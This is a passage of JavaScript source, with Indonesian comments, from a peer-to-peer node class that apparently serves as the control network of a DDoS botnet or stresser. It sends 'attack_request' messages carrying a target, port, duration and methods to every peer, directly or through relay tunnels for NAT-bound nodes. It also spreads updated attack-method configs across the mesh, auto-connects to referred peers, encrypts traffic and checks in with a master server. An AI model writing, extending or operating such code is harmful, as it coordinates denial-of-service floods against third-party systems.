      const attackPayload = { type: 'attack_request', target, time, port, methods };

      for (let i = 0; i < tunnelList.length; i += maxParallel) {
        const batch = tunnelList.slice(i, i + maxParallel);
        const batchResults = await Promise.all(
          batch.map(async ([reverseId, relayId]) => {
            try {
              this.stats.tunnelAttacksSent++;
              const requestId = crypto.randomBytes(8).toString('hex');
              const fullPayload = { ...attackPayload, requestId };

              // Kirim via tunnel, tunggu attack_response
              const tunnelResult = await this.sendViaTunnel(reverseId, fullPayload, 'attack_request');

              // sendViaTunnel hanya konfirmasi tunnel diterima relay
              // Response attack_response datang via tunnel_delivery → handleTunnelDelivery → handlePeerMessage
              // Untuk simplisitas, anggap berhasil jika tunnel diterima
              if (tunnelResult?.success) {
                successCount++;
                return { nodeId: reverseId, via: `tunnel:${relayId}`, success: true, error: null };
              } else {
                failedCount++; this.stats.broadcastAttacksFailed++;
                return { nodeId: reverseId, via: `tunnel:${relayId}`, success: false, error: tunnelResult?.error || 'Tunnel failed' };
              }
            } catch (err) {
              failedCount++; this.stats.broadcastAttacksFailed++;
              return { nodeId: reverseId, via: 'tunnel', success: false, error: err.message };
            }
          })
        );
        results.push(...batchResults);
      }
    }

    const summary = { totalTargets, direct: directTargets.size, tunnel: tunnelTargets.size, success: successCount, failed: failedCount };
    console.log('[P2P-ATTACK-BROADCAST] Done:', summary);

    return { success: successCount > 0, summary, results };
  }

  // ==========================================================
  // METHODS PROPAGATION
  // ==========================================================

  propagateMethodsUpdateImmediate(excludeNodeId = null, versionHash = null, propagationChain = []) {
    const version = versionHash || this.methodsVersionHash;
    const localMethodsCount = Object.keys(this.methodsConfig).length;

    const newChain = propagationChain.includes(this.nodeId)
      ? propagationChain
      : [...propagationChain, this.nodeId];

    if (newChain.length >= this.p2pConfig.maxPropagationHops) return 0;

    let notified = 0;
    const notificationPromises = [];

    for (const [nodeId, peer] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (newChain.includes(nodeId)) continue;
      if (peer.methodsVersion === version) continue;

      const notification = {
        type: 'methods_update_notification',
        methodsVersion: version,
        methodsCount: localMethodsCount,
        sourceNodeId: excludeNodeId || this.nodeId,
        propagationChain: newChain,
        timestamp: Date.now(),
        urgent: true
      };

      const enc = this.encryptMessage(notification, 'methods_update_notification');
      const sent = this.sendToPeer(nodeId, enc.data);

      if (sent) {
        notified++;
        notificationPromises.push(this.sendMethodsConfigToPeer(nodeId, version, newChain));
      }
    }

    Promise.all(notificationPromises).catch(err => {
      console.error('[P2P-METHODS] Error in propagation:', err.message);
    });

    return notified;
  }

  async sendMethodsConfigToPeer(nodeId, versionHash, propagationChain = []) {
    try {
      const message = {
        type: 'methods_push',
        nodeId: this.nodeId,
        methods: this.methodsConfig,
        methodsVersion: versionHash,
        methodsCount: Object.keys(this.methodsConfig).length,
        propagationChain,
        timestamp: Date.now()
      };

      const enc = this.encryptMessage(message, 'methods_push');
      const sent = this.sendToPeer(nodeId, enc.data);
      if (sent) this.stats.filesShared++;
      return sent;
    } catch (error) {
      console.error(`[P2P-METHODS] Failed to push config to ${nodeId}:`, error.message);
      return false;
    }
  }

  async syncMethodsFromPeers() {
    if (this.peers.size === 0) {
      return { success: false, error: 'No peers connected' };
    }

    let bestPeer = null;
    let maxMethods = Object.keys(this.methodsConfig).length;

    for (const [nodeId, peer] of this.peers) {
      if (peer.methodsCount > maxMethods) {
        bestPeer = nodeId;
        maxMethods = peer.methodsCount;
      }
    }

    if (!bestPeer) {
      return { success: false, error: 'No peer with newer methods' };
    }

    const result = await this.requestMethodsFromPeer(bestPeer);
    if (result && result.success !== false) {
      this.stats.lastMethodSync = this.stats.lastMethodSync || Date.now();
      return { success: true, fromPeer: bestPeer };
    }
    return { success: false, error: result?.error || 'Sync failed' };
  }

  // ==========================================================
  // PEER DISCOVERY & AUTO-CONNECT
  // ==========================================================

  startPeerDiscovery() {
    if (this.discoveryInterval) clearInterval(this.discoveryInterval);

    console.log(`[P2P-DISCOVERY] Starting peer discovery every ${this.p2pConfig.discoveryInterval}ms`);

    setTimeout(() => this.discoverPeers(), 5000);

    this.discoveryInterval = setInterval(() => {
      if (!this.isShuttingDown) this.discoverPeers();
    }, this.p2pConfig.discoveryInterval);
  }

  async discoverPeers() {
    // discoverPeers now delegates to _doMasterSignaling (unified)
    await this._doMasterSignaling();
  }

  startAutoConnector() {
    if (!this.p2pConfig.autoConnect) return;
    if (this.autoConnectInterval) clearInterval(this.autoConnectInterval);

    console.log(`[P2P-AUTO] Starting auto-connector`);

    setTimeout(() => this.autoConnectToPeers(), this.p2pConfig.autoConnectDelay);

    this.autoConnectInterval = setInterval(() => {
      if (!this.isShuttingDown) this.autoConnectToPeers();
    }, this.p2pConfig.autoConnectDelay);
  }

  async autoConnectToPeers() {
    if (this.isShuttingDown) return;

    const totalConnections = this.peers.size + this.connectionLocks.size;
    if (totalConnections >= this.p2pConfig.maxPeers) return;

    const availablePeers = Array.from(this.knownPeers.values())
      .filter(peer => {
        return peer.canConnectTo &&
          peer.nodeId !== this.nodeId &&
          peer.ip &&
          peer.port &&
          !this.peers.has(peer.nodeId) &&
          !this.connectionLocks.has(peer.nodeId) &&
          !this.isBlacklisted(peer.nodeId);
      })
      .sort((a, b) => {
        if (a.fromReferral && !b.fromReferral) return -1;
        if (!a.fromReferral && b.fromReferral) return 1;
        return b.lastUpdate - a.lastUpdate;
      })
      .slice(0, this.p2pConfig.maxPeers - totalConnections);

    if (availablePeers.length === 0) return;

    console.log(`[P2P-AUTO] Auto-connecting to ${availablePeers.length} peer(s)...`);
    this.stats.lastAutoConnect = Date.now();

    const maxParallel = 3;
    for (let i = 0; i < availablePeers.length; i += maxParallel) {
      if (this.isShuttingDown) break;

      const currentTotal = this.peers.size + this.connectionLocks.size;
      if (currentTotal >= this.p2pConfig.maxPeers) break;

      const batch = availablePeers.slice(i, i + maxParallel);

      await Promise.all(batch.map(async peer => {
        try {
          const result = await this.connectToPeer(peer.nodeId, peer);
          if (result.success && !result.existing) {
            console.log(`[P2P-AUTO] Connected to ${peer.nodeId} (${peer.ip}:${peer.port})`);
            if (peer.fromReferral) this.stats.connectionsViaReferral++;
          }
        } catch (error) {
          console.error(`[P2P-AUTO] Error connecting to ${peer.nodeId}:`, error.message);
        }
      }));

      if (i + maxParallel < availablePeers.length) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }

    // NEW: If we are REVERSE, also trigger outbound to DIRECT peers
    if (this.nodeMode === 'REVERSE') {
      this._scheduleReverseOutboundConnect();
    }
  }

  // ==========================================================
  // PEER CLEANUP, HEARTBEAT, HANDLER CLEANUP
  // ==========================================================

  startPeerCleanup() {
    if (this.peerCleanupInterval) clearInterval(this.peerCleanupInterval);

    this.peerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;

      const now = Date.now();
      const timeout = this.p2pConfig.peerTimeout;

      // Clean stale knownPeers
      let removedKnown = 0;
      for (const [nodeId, peer] of this.knownPeers) {
        if (now - peer.lastUpdate > timeout * 2) {
          this.knownPeers.delete(nodeId);
          removedKnown++;
        }
      }

      // Clean timed-out connections
      let removedConnections = 0;
      for (const [nodeId, peer] of this.peers) {
        if (now - peer.lastSeen > timeout) {
          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out`);
          try { peer.ws.close(); } catch {}
          this.peers.delete(nodeId);
          this.connectionLocks.delete(nodeId);
          this.reversePeers.delete(nodeId);
          removedConnections++;
        }
      }

      // Clean stale locks
      for (const [nodeId, lockTime] of this.connectionLocks) {
        if (now - lockTime > this.p2pConfig.connectionLockTimeout) {
          this.connectionLocks.delete(nodeId);
        }
      }

      // Clean old message queues
      for (const [nodeId, queue] of this.messageQueue) {
        const filtered = queue.filter(item => now - item.timestamp < 300000);
        if (filtered.length === 0) this.messageQueue.delete(nodeId);
        else if (filtered.length < queue.length) this.messageQueue.set(nodeId, filtered);
      }

      // Clean expired blacklist
      for (const [nodeId, entry] of this.peerBlacklist) {
        if (now > entry.until) this.peerBlacklist.delete(nodeId);
      }

      // Clean propagation locks
      for (const [version, timestamp] of this.methodUpdatePropagationLock) {
        if (now - timestamp > this.p2pConfig.propagationCooldown) {
          this.methodUpdatePropagationLock.delete(version);
        }
      }

      // Sync reversePeers with peers
      for (const [nodeId] of this.reversePeers) {
        if (!this.peers.has(nodeId)) {
          this.reversePeers.delete(nodeId);
        }
      }

    }, this.p2pConfig.cleanupInterval);

    console.log('[P2P-CLEANUP] Peer cleanup started');
  }

  startPeerHeartbeat() {
    if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);

    this.heartbeatInterval = setInterval(() => {
      if (this.isShuttingDown) return;

      for (const [nodeId, peer] of this.peers) {
        try {
          if (peer.ws.readyState === WebSocket.OPEN) {
            peer.ws.ping();
          }
        } catch (error) {
          console.error(`[P2P-HEARTBEAT] Error pinging ${nodeId}:`, error.message);
        }
      }

      // Check master connectivity periodically
      const now = Date.now();
      if (!this.lastMasterCheck || (now - this.lastMasterCheck > 60000)) {
        this.checkMasterConnectivity();
      }

      // Jika kita DIRECT node dengan REVERSE peers, broadcast reverse list periodik
      // supaya peers selalu tahu siapa saja REVERSE yang ada di pool kita
      if (this.reversePeers.size > 0 && this.peers.size > 0) {
        this.broadcastReverseList();
      }

    }, this.p2pConfig.heartbeatInterval);

    console.log(`[P2P-HEARTBEAT] Heartbeat started (${this.p2pConfig.heartbeatInterval}ms)`);
  }

  startHandlerCleanup() {
    if (this.handlerCleanupInterval) clearInterval(this.handlerCleanupInterval);

    this.handlerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;

      const now = Date.now();
      const timeout = 60000;
      let cleaned = 0;

      for (const [key, timestamp] of this.requestHandlerTimestamps) {
        if (now - timestamp > timeout) {
          const handlerInfo = this.requestHandlers.get(key);
          if (handlerInfo) {
            const { eventName, handler } = handlerInfo;
            this.removeListener(eventName, handler);
            this.requestHandlers.delete(key);
            this.requestHandlerTimestamps.delete(key);
            cleaned++;
            this.stats.requestHandlersCleaned++;
          }
        }
      }

      if (cleaned > 0) {
        console.log(`[P2P-CLEANUP] Cleaned ${cleaned} stale request handlers`);
        this.stats.memoryLeaksPrevent++;
      }
    }, 30000);
  }

  startMethodSyncChecker() {
    if (this.methodSyncInterval) clearInterval(this.methodSyncInterval);

    this.methodSyncInterval = setInterval(async () => {
      if (this.isShuttingDown || !this.p2pConfig.preferP2PSync) return;
      if (this.peers.size === 0) return;

      const localCount = Object.keys(this.methodsConfig).length;
      let needsSync = false;

      for (const [, peer] of this.peers) {
        if (peer.methodsVersion && peer.methodsVersion !== this.methodsVersionHash) {
          if (peer.methodsCount > localCount) {
            needsSync = true;
            break;
          }
        }
      }

      if (needsSync) {
        console.log('[P2P-METHODS] Detected newer methods from peers, syncing...');
        await this.syncMethodsFromPeers();
      }
    }, this.p2pConfig.methodSyncInterval);
  }

  // ==========================================================
  // SEND / QUEUE / BROADCAST
  // ==========================================================

  sendToPeer(nodeId, message) {
    const peer = this.peers.get(nodeId);
    if (!peer || !peer.connected) {
      this.queueMessage(nodeId, message);
      return false;
    }

    try {
      if (peer.ws.readyState === WebSocket.OPEN) {
        const msgStr = JSON.stringify(message);
        peer.ws.send(msgStr);
        peer.messagesSent++;

        if (message && message.envelope === 'secure') {
          this.stats.encryptedMessagesSent++;
        } else {
          this.stats.plainMessagesSent++;
        }
        this.stats.messagesSent++;
        return true;
      }

      this.queueMessage(nodeId, message);
      return false;
    } catch (error) {
      console.error(`[P2P] Failed to send to ${nodeId}:`, error.message);
      this.queueMessage(nodeId, message);
      return false;
    }
  }

  queueMessage(nodeId, message) {
    if (!this.messageQueue.has(nodeId)) this.messageQueue.set(nodeId, []);

    const queue = this.messageQueue.get(nodeId);
    if (queue.length >= this.p2pConfig.messageQueueSize) queue.shift();

    queue.push({ message, timestamp: Date.now() });
    this.stats.messagesQueued++;
  }

  processQueuedMessages(nodeId) {
    const queue = this.messageQueue.get(nodeId);
    if (!queue || queue.length === 0) {
      this.messageQueue.delete(nodeId);
      return;
    }

    const peer = this.peers.get(nodeId);
    if (!peer || !peer.ws || peer.ws.readyState !== WebSocket.OPEN) return;

    console.log(`[P2P] Processing ${queue.length} queued messages for ${nodeId}`);

    let sent = 0;
    for (const item of queue) {
      try {
        peer.ws.send(JSON.stringify(item.message));
        peer.messagesSent++;
        if (item.message && item.message.envelope === 'secure') {
          this.stats.encryptedMessagesSent++;
        } else {
          this.stats.plainMessagesSent++;
        }
        this.stats.messagesSent++;
        sent++;
      } catch (error) {
        console.error(`[P2P] Failed to flush queued message to ${nodeId}:`, error.message);
      }
    }

    this.messageQueue.delete(nodeId);
    console.log(`[P2P] Flushed ${sent} queued messages to ${nodeId}`);
  }

  broadcastToPeers(message, excludeNodeId = null) {
    let sent = 0;
    const enc = this.encryptMessage(message, message.type || 'broadcast');

    for (const [nodeId] of this.peers) {
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (this.sendToPeer(nodeId, enc.data)) sent++;
    }

    return sent;
  }

  // ==========================================================
  // UTILITIES
  // ==========================================================

  normalizePort(port) {
    if (typeof port === 'string') {
      const parsed = parseInt(port, 10);
      return Number.isNaN(parsed) ? null : parsed;
    }
    return typeof port === 'number' ? port : null;
  }

  isBlacklisted(nodeId) {
    const entry = this.peerBlacklist.get(nodeId);
    if (!entry) return false;
    if (Date.now() > entry.until) {
      this.peerBlacklist.delete(nodeId);
      return false;
    }
    return true;
  }

  blacklistPeer(nodeId, reason, duration = null) {
    const until = Date.now() + (duration || this.p2pConfig.blacklistDuration);
    this.peerBlacklist.set(nodeId, { reason, until });
    console.log(`[P2P] Blacklisted peer ${nodeId}: ${reason}`);
  }

  handlePeerDisconnected(nodeId, code, reason) {
    if (!this.peers.has(nodeId) && !this.connectionLocks.has(nodeId)) return;

    this.peers.delete(nodeId);
    this.connectionLocks.delete(nodeId);
    this.reversePeers.delete(nodeId);

    // Bersihkan knownReversePeers yang route-nya via nodeId yang disconnect
    for (const [reverseId, relayId] of this.knownReversePeers) {
      if (relayId === nodeId) {
        this.knownReversePeers.delete(reverseId);
      }
    }

    this.emit('peer_disconnected', { nodeId, code, reason: reason?.toString() || 'Unknown' });
  }

  getPeerReferrals(excludeNodeId = null) {
    const referrals = [];

    for (const [nodeId, peer] of this.knownPeers) {
      if (nodeId === this.nodeId) continue;
      if (excludeNodeId && nodeId === excludeNodeId) continue;
      if (this.isBlacklisted(nodeId)) continue;
      if (peer.mode === 'REVERSE' || !peer.canConnectTo) continue; // Don't refer REVERSE nodes

      referrals.push({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        lastSeen: peer.lastUpdate,
        methodsCount: peer.methodsCount || 0
      });

      if (referrals.length >= this.p2pConfig.maxReferralsToSend) break;
    }

    return referrals;
  }

  async checkMasterConnectivity() {
    if (!this.config.MASTER?.URL) {
      this.masterReachable = false;
      return false;
    }

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/status`, { signal: controller.signal });
      clearTimeout(timeout);
      this.masterReachable = response.ok;
      this.lastMasterCheck = Date.now();
      return this.masterReachable;
    } catch (error) {
      this.masterReachable = false;
      this.lastMasterCheck = Date.now();
      return false;
    }
  }

  // ==========================================================
  // STATUS
  // ==========================================================

  getStatus() {
    const methodsCount = Object.keys(this.methodsConfig).length;
    const messageQueueTotal = Array.from(this.messageQueue.values()).reduce((sum, q) => sum + q.length, 0);
    const totalSent = this.stats.messagesSent;
    const totalReceived = this.stats.messagesReceived;

    return {
      enabled: this.p2pConfig.enabled,
      nodeId: this.nodeId,
      nodeIp: this.nodeIp,
      nodePort: this.nodePort,
      nodeMode: this.nodeMode,
      serverReady: this.isServerReady,
      masterReachable: this.masterReachable,
      encryption: this.isEncryptionEnabled(),
      methodsVersion: this.methodsVersionHash?.substring(0, 8),
      methodsCount,
      preferP2PSync: this.p2pConfig.preferP2PSync,
      peers: {
        connected: this.peers.size,
        known: this.knownPeers.size,
        max: this.p2pConfig.maxPeers,
        locks: this.connectionLocks.size,
        blacklisted: this.peerBlacklist.size,
        reversePool: this.reversePeers.size,
        directPeers: Array.from(this.peers.values()).filter(p => p.remoteMode === 'DIRECT' || !p.remoteMode).length,
        reversePeers: Array.from(this.peers.values()).filter(p => p.remoteMode === 'REVERSE').length,
        knownReversePeers: this.knownReversePeers.size,  // REVERSE nodes reachable via tunnel
      },
      messageQueue: { peers: this.messageQueue.size, totalMessages: messageQueueTotal },
      stats: {
        ...this.stats,
        successRate: this.stats.connectionAttempts > 0
          ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
          : '0.00%',
        encryptionRate: totalSent > 0
          ? ((this.stats.encryptedMessagesSent / totalSent) * 100).toFixed(2) + '%'
          : '0.00%'
      },
      config: {
        autoConnect: this.p2pConfig.autoConnect,
        relayFallback: this.p2pConfig.relayFallback,
        maxPeers: this.p2pConfig.maxPeers,
        discoveryInterval: this.p2pConfig.discoveryInterval,
        reverseP2PEnabled: this.p2pConfig.reverseP2PEnabled,
        masterSignalingEnabled: this.p2pConfig.masterSignalingEnabled
      },
      connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
        nodeId,
        ip: peer.ip,
        port: peer.port,
        ourMode: peer.mode,
        remoteMode: peer.remoteMode || 'DIRECT',
        isReverseNode: peer.isReverseNode || false,
        isOutbound: peer.isOutbound || false,
        isRelayProvider: peer.isRelayProvider || false,
        direct: peer.direct,
        lastSeen: peer.lastSeen,
        connectedAt: peer.connectedAt,
        uptime: Date.now() - peer.connectedAt,
        methodsVersion: peer.methodsVersion?.substring(0, 8),
        methodsCount: peer.methodsCount,
        supportsEncryption: peer.supportsEncryption,
        supportsTunnel: peer.supportsTunnel || false
      })),
      knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        reachable: peer.reachable,
        canConnectTo: peer.canConnectTo,
        connected: this.peers.has(peer.nodeId),
        blacklisted: this.isBlacklisted(peer.nodeId),
        methodsCount: peer.methodsCount
      }))
    };
  }

  // ==========================================================
  // SHUTDOWN / CLEANUP
  // ==========================================================

  cleanup() {
    if (this.wss) {
      try { this.wss.close(); } catch {}
      this.wss = null;
    }
    this.isServerReady = false;
  }

  shutdown() {
    console.log('[P2P] Shutting down P2P node...');
    this.isShuttingDown = true;

    const intervals = [
      'discoveryInterval', 'peerCleanupInterval', 'heartbeatInterval',
      'autoConnectInterval', 'methodSyncInterval', 'handlerCleanupInterval',
      'reverseReconnectInterval', 'masterSignalingInterval'
    ];

    for (const name of intervals) {
      if (this[name]) {
        clearInterval(this[name]);
        this[name] = null;
      }
    }

    // Cleanup all request handlers
    for (const [, value] of this.requestHandlers) {
      const { eventName, handler } = value;
      this.removeListener(eventName, handler);
    }
    this.requestHandlers.clear();
    this.requestHandlerTimestamps.clear();

    // Send goodbye to all peers
    const goodbyeMessage = { type: 'goodbye', nodeId: this.nodeId, timestamp: Date.now() };

    for (const [nodeId, peer] of this.peers) {
      try {
        const enc = this.encryptMessage(goodbyeMessage, 'goodbye');
        this.sendToPeer(nodeId, enc.data);
        setTimeout(() => { try { peer.ws.close(); } catch {} }, 500);
      } catch {}
    }

    setTimeout(() => {
      this.peers.clear();
      this.knownPeers.clear();
      this.connectionLocks.clear();
      this.messageQueue.clear();
      this.peerBlacklist.clear();
      this.receivedReferrals.clear();
      this.referralTimestamps.clear();
      this.methodUpdatePropagationLock.clear();
      this.reversePeers.clear();
    }, 1000);

    this.cleanup();
    this.removeAllListeners();

    console.log('[P2P] P2P node shutdown complete');
  }
}

export default P2PHybridNode;